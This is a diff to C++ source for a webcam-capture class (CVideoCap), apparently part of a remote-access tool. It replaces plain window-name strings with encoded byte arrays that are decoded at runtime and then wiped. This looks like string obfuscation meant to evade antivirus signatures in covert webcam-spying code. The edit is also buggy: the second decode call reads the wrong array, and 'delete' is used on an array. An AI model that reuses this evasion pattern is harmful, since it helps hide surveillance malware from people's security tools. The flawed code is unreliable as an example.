@@ -3,8 +3,8 @@
 //////////////////////////////////////////////////////////////////////
 #include "..\pch.h"
 #include "VideoCap.h"
-//#include "..\DynamicAPI.h"
 #include "..\DynamicAPI.h"
+#include "..\StrCry.h"
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
@@ -21,19 +21,24 @@ CVideoCap::CVideoCap()
 
 	if (!IsWebCam() || m_bIsConnected)
 		return;
+
+
 	//"#32770默认的窗口类名
-	m_hWnd = CreateWindow("#32770", /* Dialog */ "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
-	m_hWndCap = capCreateCaptureWindow
-		(
-		"VideoCapWindow", 
-		WS_CHILD | WS_VISIBLE,
-		0,
-		0,
-		0,
-		0,
-		m_hWnd,
-		0
-		);
+	char classname32770[] = { 0x06,0xe8,0xf9,0xfb,0xff,0xf0,0xf6 };	//#32770
+	char* lpClassName = decodeStr(classname32770);					//解密函数
+
+	m_hWnd = CreateWindow(lpClassName, /* Dialog */ "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
+
+	memset(lpClassName, 0, classname32770[STR_CRY_LENGTH]);					//填充0
+	delete lpClassName;
+
+	char VideoCapWindow[] = { 0x0e,0x9d,0xa3,0xad,0xad,0xa8,0x85,0xa4,0xb4,0x94,0xab,0xaf,0xa4,0xd0,0xc9 };	//VideoCapWindow
+	char* lpszWindowName = decodeStr(classname32770);					//解密函数
+
+	m_hWndCap = capCreateCaptureWindow(lpszWindowName, WS_CHILD | WS_VISIBLE, 0, 0, 0, 0, m_hWnd, 0);
+
+	memset(lpszWindowName, 0, VideoCapWindow[STR_CRY_LENGTH]);					//填充0
+	delete lpszWindowName;
 }
 
 CVideoCap::~CVideoCap()
